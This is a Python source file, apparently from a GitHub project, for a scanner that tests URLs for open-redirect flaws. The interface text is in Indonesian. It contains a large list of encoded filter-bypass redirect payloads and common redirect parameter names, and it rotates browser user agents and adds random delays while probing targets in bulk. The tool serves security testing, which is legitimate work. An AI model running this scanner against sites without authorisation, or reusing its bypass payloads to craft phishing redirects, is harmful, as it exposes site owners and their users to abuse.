# Github: https://github.com/denoyey/Open-Redirect

# File: openredirect.py
# Python script to scan for open redirects
# This script checks URLs for open redirect vulnerabilities by testing various payloads

import requests
import urllib.parse
import json
import csv
import os
import random
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

REDIRECT_DOMAIN = "bing.com"
TIMEOUT = 5
THREADS = 10

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/15.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
]


def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
    }


bypass_payloads = [
    "https://bing.com",
    "//bing.com",
    "///bing.com",
    "/\\bing.com",
    "https:/bing.com",
    "http://bing.com",
    "https://bing.com/",
    "https://www.bing.com",
    "https://bing%E3%80%82com",
    "https://bing%252ecom",
    "https%3A%2F%2Fbing.com",
    "%68%74%74%70%73%3A%2F%2Fbing.com",
    "https://bing.com/%2e%2e",
    "https://bing.com/%2f%2e%2e",
    "https://bing.com/%2f..",
    "https://bing.com%2e%2e",
    "https://bing.com%2f%2e%2e",
    "https://bing.com/..;/",
    "https://bing.com\\..\\",
    "https://bing.com\\..",
    "%09/https://bing.com",
    "%5c/https://bing.com",
    "%2F/bing.com",
    "%0Dbing.com",
    "%0Abing.com",
    "%00https://bing.com",
    "%2e%2e/https://bing.com",
    "https:http://bing.com",
    "https://@bing.com",
    "https://bing.com#@bing.com",
    "https://bing.com?@bing.com",
    "https://bing.com%23@bing.com",
    "http://bing.com%3Fredirect=http://google.com",
    "https://bing.com?redirect=https://bing.com",
    "/redirect?next=https://bing.com",
    "///bing.com/%2e%2e",
    "///bing.com/",
    "//bing.com#",
    "//bing.com%00.example.com",
    "//bing.com%01.example.com",
    "https://bing.com/http://bing.com",
    "https://bing.com?url=https://bing.com",
    "https://bing.com?redirect=http://bing.com",
    "%252F%252Fbing.com",
    "%2F%2Fbing.com",
    "%252e%252e/https://bing.com",
]

redirect_params = [
    "redir",
    "redirect_url",
    "redirect_uri",
    "redirectUrl",
    "RedirectURL",
    "redir_url",
    "rediruri",
    "redir_uri",
    "redirect_to",
    "redirectTo",
    "redirectlink",
    "goto",
    "out",
    "continue",
    "continueUrl",
    "RelayState",
    "checkout_url",
    "returnurl",
    "returnURL",
    "ReturnURL",
    "returl",
    "ret_url",
    "external_url",
    "externalLink",
    "back",
    "callback",
    "cb",
    "open",
    "openurl",
    "open_url",
    "from",
    "to",
    "desturl",
    "dest_url",
    "url_redirect",
    "jump",
    "jump_to",
    "go_url",
    "next_page",
    "data",
    "uri",
    "navigation",
    "nav",
    "source",
    "surl",
    "targeturl",
    "url_dest",
    "final",
    "finalurl",
    "fetch",
    "targetURI",
    "redirTo",
    "ref",
    "forward",
    "fwd",
    "goToUrl",
    "click_url",
    "track_url",
]


def logo():
    github_url = "GITHUB: https://github.com/denoyey/Open-Redirect"
    print(
        rf"""{Fore.LIGHTMAGENTA_EX}
 ____  ____  _____ _            ____  _____ ____  _  ____  _____ ____ _____ 
/  _ \/  __\/  __// \  /|      /  __\/  __//  _ \/ \/  __\/  __//   _Y__ __\
| / \||  \/||  \  | |\ ||_____ |  \/||  \  | | \|| ||  \/||  \  |  /   / \  
| \_/||  __/|  /_ | | \||\____\|    /|  /_ | |_/|| ||    /|  /_ |  \_  | |  
\____/\_/   \____\\_/  \|      \_/\_\\____\\____/\_/\_/\_\\____\\____/ \_/  
{Style.RESET_ALL}                                                                            
            {Fore.LIGHTYELLOW_EX}{github_url}{Style.RESET_ALL}              
                """
    )


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def is_valid_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        return parsed.scheme in ["http", "https"] and parsed.netloc
    except:
        return False


def log(msg, file=None):
    now = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    print(f"{now} {msg}")
    if file:
        file.write(f"{now} {msg}\n")


def scan_url(base_url):
    results = []
    for param in redirect_params:
        for payload in bypass_payloads:
            encoded = urllib.parse.quote(payload, safe="")
            full_url = f"{base_url}?{param}={encoded}"
            headers = get_headers()
            try:
                res = requests.get(
                    full_url, headers=headers, allow_redirects=False, timeout=TIMEOUT
                )
                if res.status_code in [301, 302, 303, 307, 308]:
                    loc = res.headers.get("Location", "")
                    if REDIRECT_DOMAIN in urllib.parse.urlparse(loc).netloc:
                        results.append(
                            {
                                "target": base_url,
                                "parameter": param,
                                "payload": payload,
                                "test_url": full_url,
                                "redirect_to": loc,
                                "status_code": res.status_code,
                            }
                        )
                        return results
            except requests.RequestException:
                continue
            time.sleep(random.uniform(0.1, 0.5))
    return results


def process_url(url, file, data):
    if not is_valid_url(url):
        log(f"\n{Fore.YELLOW}[!] Invalid URL: {url}{Style.RESET_ALL}", file)
        return
    result = scan_url(url)
    if result:
        entry = result[0]
        log(
            f"\n{Fore.GREEN}[VULN] {entry['test_url']} -> {entry['redirect_to']} [HTTP {entry['status_code']}]",
            file,
        )
        data.append(entry)
    else:
        log(f"\n{Fore.RED}[SAFE] {url}{Style.RESET_ALL}", file)


def export(data):
    if not data:
        print(f"\n{Fore.CYAN}[i] Tidak ada hasil untuk diekspor.{Style.RESET_ALL}")
        return
    with open("result.json", "w") as jf:
        json.dump(data, jf, indent=2)
    print(f"{Fore.CYAN}[✔] Disimpan ke result.json{Style.RESET_ALL}")
    with open("result.csv", "w", newline="", encoding="utf-8") as cf:
        writer = csv.DictWriter(
            cf,
            fieldnames=[
                "target",
                "parameter",
                "payload",
                "test_url",
                "redirect_to",
                "status_code",
            ],
        )
        writer.writeheader()
        writer.writerows(data)
    print(f"\n{Fore.CYAN}[✔] Disimpan ke result.csv{Style.RESET_ALL}")


def scan_from_file(path):
    if not os.path.exists(path):
        print(f"\n{Fore.YELLOW}[!] File tidak ditemukan: {path}{Style.RESET_ALL}")
        return
    results = []
    with open("log.txt", "w") as log_file, open(path, "r") as f:
        targets = [line.strip() for line in f if line.strip()]
        log(f"\n🔍 Memulai scan {len(targets)} URL...\n", log_file)
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            for url in targets:
                executor.submit(process_url, url, log_file, results)
    export(results)


def scan_single_url():
    url = input(
        "\nMasukkan URL target (contoh: https://example.com/redirect?url=)\n>> "
    ).strip()
    results = []
    with open("log.txt", "w") as log_file:
        process_url(url, log_file, results)
    export(results)


def main():
    try:
        while True:
            clear_screen()
            logo()
            print(
                f"""
[ -------- MENU -------- ]
[1] Scan satu URL
[2] Scan dari file list
[0] Keluar
            """
            )
            pilihan = input("Pilih mode (1/2) >> ").strip()
            if pilihan == "1":
                clear_screen()
                logo()
                scan_single_url()
            elif pilihan == "2":
                clear_screen()
                logo()
                path = input("Masukkan path file .txt: ").strip()
                scan_from_file(path)
            elif pilihan.lower() == "0":
                clear_screen()
                logo()
                print(
                    f"\n{Fore.GREEN}[!] Terimakasih sudah menggunakan tools ini :D{Style.RESET_ALL}"
                )
                break
            else:
                print(f"\n{Fore.RED}[!] Pilihan tidak dikenali.{Style.RESET_ALL}")
                input(f"\n{Fore.BLUE}[Tekan ENTER]{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Pemindaian dibatalkan.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n\n{Fore.RED}[!] Terjadi kesalahan: {e}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
